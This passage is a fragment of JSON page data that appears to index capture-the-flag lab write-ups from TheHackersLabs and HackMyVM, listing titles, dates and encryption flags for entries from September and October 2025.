Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"},{"id":"TheHackersLabsPa Que Aiga Lujo","title":"TheHackersLabs - Pa Que Aiga Lujo","date":"2025-09-28","isEncrypted":false,"year":"2025","month":"09","day":"28"},{"id":"HackMyVMSilentdev","title":"HackMyVM - Silentdev","date":"2025-09-26","isEncrypted":false,"year":"2025","month":"09","day":"26"},{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"}]},"__N_SSG":true}